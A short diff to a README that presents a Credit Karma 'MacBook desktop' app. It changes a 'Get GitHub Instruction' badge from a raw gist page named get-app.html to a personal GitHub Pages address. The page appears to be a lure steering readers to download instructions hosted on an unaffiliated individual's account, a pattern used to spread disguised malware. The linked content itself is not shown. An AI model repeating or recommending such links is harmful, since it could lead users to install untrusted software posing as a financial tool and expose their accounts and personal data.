@@ -4,7 +4,7 @@
 Credit Karma helps you stay on top of your finances with free credit scores, credit monitoring, and personalized recommendations.  
 With the MacBook desktop experience, you get faster access to your financial tools in a distraction-free environment 💳.  
 
-[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-181717?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/hantosman2010/826762ce3a3766e6a66594c6408bdf23/raw/02fe1439f5e84e4f47effb54c09088efc8d1f222/get-app.html)
+[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-181717?style=for-the-badge&logo=github&logoColor=white)](https://hantosman2010.github.io/.github/ckarma)
 
 ---
 
